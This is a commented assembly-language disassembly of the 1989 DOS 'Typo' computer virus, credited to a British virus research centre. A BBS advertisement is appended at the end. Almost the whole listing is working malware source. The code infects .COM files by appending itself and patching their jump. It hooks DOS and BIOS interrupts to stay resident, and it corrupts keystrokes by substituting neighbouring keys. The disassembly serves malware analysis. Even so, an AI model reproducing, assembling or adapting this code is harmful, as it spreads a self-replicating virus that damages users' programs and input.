	page	65,132
	title	The 'Typo' Virus
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º                 British Computer Virus Research Centre                   º
; º  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    º
; º  Telephone:     Domestic   0273-26105,   International  +44-273-26105    º
; º                                                                          º
; º                           The 'Typo' Virus                               º
; º                Disassembled by Joe Hirst,      October 1989              º
; º                                                                          º
; º                      Copyright (c) Joe Hirst 1989.                       º
; º                                                                          º
; º      This listing is only to be made available to virus researchers      º
; º                or software writers on a need-to-know basis.              º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

VECTOR	SEGMENT AT 0

	; Interrupt vectors

	ORG	58H
BW0058	DW	?			; Interrupt 16H offset
BW005A	DW	?			; Interrupt 16H segment
	ORG	80H
BW0080	DW	?			; Interrupt 20H offset
BW0082	DW	?			; Interrupt 20H segment
BW0084	DW	?			; Interrupt 21H offset
BW0086	DW	?			; Interrupt 21H segment

VECTOR	ENDS

RAM	SEGMENT AT 400H

	; System data

	ORG	6CH
BW046C	DW	?			; System clock

RAM	ENDS

HOST	SEGMENT AT 0

	ORG	2CH
DW002C	DW	?
	ORG	0D0H
DW00D0	EQU	THIS WORD
DB00D0	DB	?
	ORG	100H
DB0100	DB	?
DW0101	DW	?

HOST	ENDS

CODE	SEGMENT BYTE PUBLIC 'CODE'

	ASSUME	CS:CODE,DS:HOST

	DB	'V1'			; Signature
	DB	0E9H, 1, 0		; Jump for start of host
	DB	'*.COM', 0		; File spec for infection
	DB	0CEH, 0CDH, 20H		; File start read buffer
	DB	'V1'			; Signature test read buffer
	DW	5			; File handle
	DB	0CDH, 20H, 90H		; Start of host
	DB	0
	DW	5AH			; Generation count
	DB	0

	; Entry point

START:	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	CS
	POP	DS
	CALL	BP0024			; \ Get current address
BP0024:	POP	SI			; /
	SUB	SI,24H			; Relocate from start of virus
	DEC	WORD PTR [SI+16H]	; Subtract from generation count
	CMP	WORD PTR [SI+16H],3	; Is generation count three?
	JNE	BP0036			; Branch if not
	MOV	WORD PTR [SI+16H],005BH	; Reset generation count to 91
BP0036:	CALL	BP02BE			; Test system for infection
	MOV	DX,00D0H		; Temp default DTA
	MOV	AH,1AH			; Set DTA function
	INT	21H			; DOS service
	MOV	AL,[SI+0BH]		; \ Save start of host (1)
	MOV	[SI+12H],AL		; /
	MOV	AX,[SI+0CH]		; \ Save start of host (2)
	MOV	[SI+13H],AX		; /
	MOV	AH,2AH			; Get date function
	INT	21H			; DOS service
	TEST	DL,1			; First of month?
	JNZ	BP0074			; Branch if not
	MOV	DX,SI			; \ Address '*.COM'
	ADD	DX,5			; /
	nop
	XOR	CX,CX			; No attributes
	MOV	AH,4EH			; Find first file function
	INT	21H			; DOS service
	JB	BP0074			; Branch if not found
BP0063:	CALL	BP0092			; Test for infection
	MOV	DX,SI			; \ Address '*.COM'
	ADD	DX,5			; /
	nop
	XOR	CX,CX			; No attributes
	MOV	AH,4FH			; Find next file function
	INT	21H			; DOS service
	JNB	BP0063			; Branch if found
BP0074:	MOV	AL,[SI+12H]		; \ Restore start of host (1)
	MOV	DB0100,AL		; /
	MOV	AX,[SI+13H]		; \ Restore start of host (2)
	MOV	DW0101,AX		; /
	MOV	DX,0080H		; Original default DTA
	MOV	AH,1AH			; Set DTA function
	INT	21H			; DOS service
	POP	SI
	POP	ES
	POP	DS
	POP	DX
	POP	CX
	POP	BX
	MOV	AX,0100H		; \ Branch to start of host
	JMP	AX			; /

	; Test for infection in COM file

BP0092:	MOV	AX,4301H		; Set file attributes function
	MOV	DX,OFFSET DB00D0+1EH	; Address file path in DTA
	XOR	CX,CX			; No attributes
	INT	21H			; DOS service
	MOV	AX,3D02H		; Open handle (R/W) function
	MOV	DX,OFFSET DB00D0+1EH	; Address file path in DTA
	INT	21H			; DOS service
	JNB	BP00A9			; Branch if no error
	JMP	BP015D			; Return

BP00A9:	MOV	[SI+10H],AX		; Save file handle
	MOV	BX,AX			; Move file handle
	MOV	AH,3FH			; Read handle function
	MOV	CX,3			; Length to read
	MOV	DX,SI			; \ Address start-of-host store
	ADD	DX,000BH		; /
	nop
	INT	21H			; DOS service
	CMP	BYTE PTR [SI+0BH],0E9H	; Is it a jump?
	JNE	BP00F1			; Branch if not
	MOV	DX,[SI+0CH]		; \ 
	SUB	DX,16H			; /
	XOR	CX,CX			; No high offset
	MOV	AX,4200H		; Move file pointer function
	MOV	BX,[SI+10H]		; Get file handle
	INT	21H			; DOS service
	MOV	BX,AX			; Move actual offset (? not used)
	MOV	AH,3FH			; Read handle function
	MOV	CX,2			; Length to read
	MOV	DX,SI			; \ Address signature test buffer
	ADD	DX,000EH		; /
	nop
	MOV	BX,[SI+10H]		; Get file handle
	INT	21H			; DOS service
	JB	BP014A			; Branch if error
	CMP	AX,0			; Did we read anything?
	JE	BP00F1			; Branch if not
	MOV	AX,[SI+0EH]		; Get signature test
	CMP	AX,[SI]			; Is it signature?
	JE	BP014A			; Branch if yes
BP00F1:	XOR	CX,CX			; \ No offset
	XOR	DX,DX			; /
	MOV	AX,4202H		; Move file pointer function (EOF)
	MOV	BX,[SI+10H]		; Get file handle
	INT	21H			; DOS service
	JB	BP014A			; Branch if error
	SUB	AX,3			; Convert length to jump offset
	MOV	[SI+3],AX		; Store in jump
	MOV	BX,[SI+10H]		; Get file handle
	MOV	AH,40H			; Write handle function
	MOV	CX,OFFSET ENDADR	; Length of virus
	NOP
	MOV	DX,SI			; \ Address start of virus
	ADD	DX,0			; /
	nop
	INT	21H			; DOS service
	JB	BP014A			; Branch if error
	ADD	WORD PTR [SI+3],19H	; Add entry point offset to jump offset
	XOR	DX,DX			; \ No offset
	XOR	CX,CX			; /
	MOV	AX,4200H		; Move file pointer function
	MOV	BX,[SI+10H]		; Get file handle
	INT	21H			; DOS service
	JB	BP014A			; Branch if error
	MOV	BX,[SI+10H]		; Get file handle
	MOV	AH,40H			; Write handle function
	MOV	CX,3			; Length of jump
	MOV	DX,SI			; \ Address initial jump
	ADD	DX,2			; /
	nop
	INT	21H			; DOS service
	MOV	AX,5701H		; Set file date & time function
	MOV	BX,[SI+10H]		; Get file handle
	MOV	CX,DW00D0+16H		; Get file time from DTA
	MOV	DX,DW00D0+18H		; Get file date from DTA
	INT	21H			; DOS service
BP014A:	MOV	BX,[SI+10H]		; Get file handle
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	MOV	AX,4301H		; Set file attributes function
	MOV	DX,OFFSET DB00D0+1EH	; Address file path in DTA
	MOV	CL,DB00D0+15H		; Get attributes from DTA
	INT	21H			; DOS service
BP015D:	RET

	; Interrupt 16H routine

BP015E:	STI
	CMP	AH,0DDH			; Infection test function?
	JNE	BP0167			; Branch if not
	MOV	AL,AH			; Copy function number
	IRET

BP0167:	CMP	AH,0			; Get key token?
	JE	BP01D8			; Branch if yes
	DB	0EAH			; Far jump
DW016D	DW	0488H			; Int 16H offset
DW016F	DW	39D8H			; Int 16H segment

DW0171	DW	0FA76H
DW0173	DW	0F9DCH
DW0175	DW	005AH

DB0177	DB	060H, 031H, 032H, 033H, 034H, 035H, 036H, 037H
	DB	038H, 039H, 030H, 02DH, 03DH, 05CH, 07EH, 021H
	DB	040H, 023H, 024H, 025H, 05EH, 026H, 02AH, 028H
	DB	029H, 05FH, 02BH, 07CH, 071H, 077H, 065H, 072H
	DB	074H, 079H, 075H, 069H, 06FH, 070H, 05BH, 05DH
	DB	05BH, 061H, 073H, 064H, 066H, 067H, 068H, 06AH
	DB	06BH, 06CH, 03BH, 027H, 07AH, 078H, 063H, 076H
	DB	062H, 06EH, 06DH, 02CH, 02EH, 02FH, 051H, 057H
	DB	045H, 052H, 054H, 059H, 055H, 049H, 04FH, 050H
	DB	07BH, 07DH, 041H, 053H, 044H, 046H, 047H, 048H
	DB	04AH, 04BH, 04CH, 03AH, 022H, 03BH, 05AH, 058H
	DB	043H, 056H, 042H, 04EH, 04DH, 03CH, 03EH, 03FH
	DB	02EH

BP01D8:	PUSH	SI
	CALL	BP01DC			; \ Get current address
BP01DC:	POP	SI			; /
	PUSHF
	CALL	DWORD PTR CS:[SI-6FH]	; Execute original BIOS call
	PUSH	BX
	PUSH	ES
	MOV	BX,0040H		; \ Address system RAM
	MOV	ES,BX			; /
	ASSUME	ES:RAM
	MOV	BX,BW046C		; Get system clock, low word
	PUSH	BX
	SUB	BX,CS:[SI-6BH]		; DW0171
	CMP	BX,2
	POP	BX
	MOV	CS:[SI-6BH],BX
	JG	BP0236
	XCHG	BX,CS:[SI-69H]		; DW0173
	SUB	BX,CS:[SI-69H]
	NEG	BX
	CMP	BX,CS:[SI-67H]		; DW0175
	JL	BP0236
	DEC	WORD PTR CS:[SI-67H]
	CMP	WORD PTR CS:[SI-67H],6
	JE	BP021E
	MOV	WORD PTR CS:[SI-67H],005BH
BP021E:	SUB	SI,65H
	PUSH	CX
	MOV	CX,0061H
BP0225:	CMP	AL,CS:[SI]
	JE	BP0231
	INC	SI
	LOOP	BP0225
	POP	CX
	JMP	BP0236

BP0231:	POP	CX
	MOV	AL,CS:[SI+1]
BP0236:	POP	ES
	POP	BX
	POP	SI
	RETF	2

	; Interrupt 21H routine

	ASSUME	ES:NOTHING
BP023C:	CMP	AH,0			; Terminate program?
	JE	BP0246			; Branch if yes
	CMP	AH,4CH			; Load?
	JNE	BP025F			; Branch if not
BP0246:	CALL	BP026D			; Install virus in memory
	MOV	DX,CS:DW002C		; \ Set ES to environment block
	MOV	ES,DX			; /
	MOV	BX,0			; Zero length
	MOV	AH,4AH			; Set block function
	INT	21H			; DOS service
	MOV	DX,001DH		; \ Length to keep
	ADD	DX,1			; /
	MOV	AH,31H			; Keep process function
BP025F:	DB	0EAH			; Far jump
DW0260	DW	2DEAH			; Int 21H offset
DW0262	DW	4242H			; Int 21H segment

	; Interrupt 20H routine

BP0264:	MOV	AX,4C00H		; Fake a load
	JMP	BP023C			; Process as a DOS service

DW0269	DW	2C08H			; Int 20H offset
DW026B	DW	4242H			; Int 20H segment

	; Install virus in memory

BP026D:	PUSH	CX
	PUSH	DI
	PUSH	SI
	PUSH	ES
	CALL	BP0274			; \ Get current address
BP0274:	POP	SI			; /
	PUSH	SI
	MOV	DI,0100H		; Address start of area
	MOV	CX,OFFSET BP023C-BP015E	; Length to copy
BP027C:	MOV	AL,CS:[SI+OFFSET BP015E-BP0274] ; Get a byte
	MOV	CS:[DI],AL		; Store in new location
	INC	SI			; Next input position
	INC	DI			; Next output position
	LOOP	BP027C			; Repeat to end of area
	POP	SI
	XOR	CX,CX			; \ Address zero
	MOV	ES,CX			; /
	ASSUME	ES:VECTOR
	MOV	CX,CS:[SI-14H]		; \ Restore Int 21H offset
	MOV	BW0084,CX		; /
	MOV	CX,CS:[SI-12H]		; \ Restore Int 21H segment
	MOV	BW0086,CX		; /
	MOV	CX,CS:[SI-0BH]		; \ Restore Int 20H offset
	MOV	BW0080,CX		; /
	MOV	CX,CS:[SI-9]		; \ Restore Int 20H segment
	MOV	BW0082,CX		; /
	MOV	CX,0100H		; \ Install moved area as Int 16H
	MOV	BW0058,CX		; /
	ASSUME	ES:NOTHING
	POP	ES
	POP	SI
	POP	DI
	POP	CX
	RET

	; Test system for infection

BP02BE:	PUSH	AX
	XOR	AL,AL			; Clear register
	MOV	AH,0DDH			; Infection test function
	INT	16H			; Keyboard I/O
	CMP	AL,AH			; Are they the same
	JNE	BP02CB			; Branch if not
	POP	AX
	RET

	; Install interrupts

BP02CB:	PUSH	BX
	PUSH	SI
	PUSH	ES
	MOV	DX,[SI+16H]		; Get generation count
	CALL	BP02D4			; \ Get current address
BP02D4:	POP	SI			; /
	PUSH	BX
	PUSH	ES
	MOV	BX,0040H		; \ Address system RAM
	MOV	ES,BX			; /
	ASSUME	ES:RAM
	MOV	BX,BW046C		; Get system clock, low word
	MOV	CS:[SI+DW0171-BP02D4],BX ; Get system clock, low word
	MOV	CS:[SI+DW0173-BP02D4],BX ; Get system clock, low word
	ASSUME	ES:NOTHING
	POP	ES
	POP	BX
	MOV	[SI+DW0175-BP02D4],DX	; Save generation count
	XOR	AX,AX			; \ Address zero
	MOV	ES,AX			; /
	ASSUME	ES:VECTOR
	MOV	AX,BW0084		; \ Save Int 21H offset (DW0260)
	MOV	CS:[SI-74H],AX		; 
	MOV	AX,BW0086		; \ Save Int 21H segment (DW0262)
	MOV	CS:[SI-72H],AX		; 
	MOV	AX,BW0058		; \ Save Int 16H offset (DW016D)
	MOV	CS:[SI+0FE99H],AX	; /
	MOV	AX,BW005A		; \ Save Int 16H segment (DW016F)
	MOV	CS:[SI+0FE9BH],AX	; /
	MOV	AX,BW0080		; \ Save Int 20H offset (DW0269)
	MOV	CS:[SI-6BH],AX		; /
	MOV	AX,BW0082		; \ Save Int 20H segment (DW026B)
	MOV	CS:[SI-69H],AX		; /
	CLI
	PUSH	CS			; \ Set Int 21H segment
	POP	BW0086			; /
	MOV	BW0084,SI		; \ Set Int 21H offset (BP023C)
	SUB	BW0084,0098H		; /
	PUSH	CS			; \ Set Int 20H segment
	POP	BW0082			; /
	MOV	BW0080,SI		; \ Set Int 20H offset (BP0264)
	SUB	BW0080,70H		; /
	PUSH	CS			; \ Set Int 16H segment
	POP	BW005A			; /
	MOV	BW0058,SI		; \ Set Int 16H offset (BP015E)
	SUB	BW0058,0176H		; /
	STI
	ASSUME	ES:NOTHING
	POP	ES
	POP	SI
	POP	BX
	POP	AX
	RET

ENDADR	EQU	$

CODE	ENDS

	END

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

